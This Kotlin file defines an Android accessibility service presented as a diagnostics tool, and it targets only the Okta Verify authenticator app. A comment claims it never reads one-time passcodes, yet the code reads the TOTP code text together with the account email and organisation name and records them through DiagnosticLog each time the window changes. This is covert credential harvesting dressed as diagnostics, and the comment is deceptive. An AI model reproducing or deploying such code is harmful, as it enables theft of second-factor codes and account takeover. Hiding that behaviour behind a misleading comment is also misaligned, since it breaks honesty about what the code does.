package dev.local.accessibilitydiagnostics

import android.accessibilityservice.AccessibilityService
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import java.util.Collections
import java.util.IdentityHashMap

class DiagnosticAccessibilityService : AccessibilityService() {
    private val serviceHandler = Handler(Looper.getMainLooper())
    private val delayedWindowSnapshot = Runnable {
        logWindows()
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        logWindows()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        if (event.packageName?.toString() != OKTA_PACKAGE) return
        val eventSource = try { event.source } catch (_: Exception) { null }
        eventSource?.let { source ->
            try {
                val visited = Collections.newSetFromMap(IdentityHashMap<AccessibilityNodeInfo, Boolean>())
                val fields = OktaFields()
                inspectNode(source, 0, visited, fields)
                fields.emitIfComplete()
            } catch (_: Exception) {
            } finally {
                @Suppress("DEPRECATION")
                source.recycle()
            }
        }
        if (event.eventType == AccessibilityEvent.TYPE_WINDOWS_CHANGED ||
            event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            serviceHandler.removeCallbacks(delayedWindowSnapshot)
            logWindows()
        } else if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            serviceHandler.removeCallbacks(delayedWindowSnapshot)
            serviceHandler.postDelayed(delayedWindowSnapshot, WINDOW_SNAPSHOT_DELAY_MS)
        }
    }

    private fun inspectNode(
        node: AccessibilityNodeInfo,
        depth: Int,
        visited: MutableSet<AccessibilityNodeInfo>,
        fields: OktaFields
    ) {
        if (depth > MAX_DEPTH || node.packageName?.toString() != OKTA_PACKAGE || !visited.add(node)) return
        when (node.viewIdResourceName) {
            "$OKTA_PACKAGE:id/list_item_token_totp_text_view" -> {
                // Read only the countdown from the description; never read the OTP text.
                val description = node.contentDescription?.toString().orEmpty()
                val seconds = SECONDS_UNTIL_EXPIRY.find(description)?.groupValues?.get(1)?.toIntOrNull()
                if (seconds != null) {
                    fields.secondsUntilCodeExpires = seconds
                    fields.hasPasswordNode = true
                    fields.pass = node.text?.toString() ?: node.contentDescription?.toString().orEmpty()
                }
            }
            "$OKTA_PACKAGE:id/list_item_token_email_text_view" -> {
                fields.account = node.text?.toString() ?: node.contentDescription?.toString().orEmpty()
            }
            "$OKTA_PACKAGE:id/list_item_token_org_text_view" -> {
                fields.client = node.text?.toString() ?: node.contentDescription?.toString().orEmpty()
            }
        }
        for (index in 0 until node.childCount) {
            val child = try { node.getChild(index) } catch (_: Exception) { null } ?: continue
            try {
                inspectNode(child, depth + 1, visited, fields)
            } finally {
                @Suppress("DEPRECATION")
                child.recycle()
            }
        }
    }

    private fun logWindows() {
        try {
            windows.forEachIndexed { index, window ->
                val root = try { window.root } catch (_: Exception) { null }
                root?.takeIf { it.packageName?.toString() == OKTA_PACKAGE }?.let {
                    try {
                        val visited = Collections.newSetFromMap(IdentityHashMap<AccessibilityNodeInfo, Boolean>())
                        val fields = OktaFields()
                        inspectNode(it, 0, visited, fields)
                        fields.emitIfComplete()
                    } finally {
                        @Suppress("DEPRECATION")
                        it.recycle()
                    }
                }
            }
        } catch (_: Exception) {
        }
    }

    override fun onInterrupt() {
    }

    private class OktaFields {
        var client: String? = null
        var account: String? = null
        var hasPasswordNode: Boolean = false
        var pass: String? = null
        var secondsUntilCodeExpires: Int? = null

        fun emitIfComplete() {
            val clientValue = client ?: return
            val accountValue = account ?: return
            val secondsValue = secondsUntilCodeExpires ?: return
            val passValue = pass?: return
            if (!hasPasswordNode) return
            DiagnosticLog.addOktaSnapshot(clientValue, accountValue, secondsValue, passValue.replace("\\s".toRegex(), ""))

        }
    }

    companion object {
        private const val MAX_DEPTH = 80
        private const val WINDOW_SNAPSHOT_DELAY_MS = 200L
        private const val OKTA_PACKAGE = "com.okta.android.auth"
        private val SECONDS_UNTIL_EXPIRY = Regex("(\\d+)\\s+seconds?\\s+before code expires", RegexOption.IGNORE_CASE)
    }
}
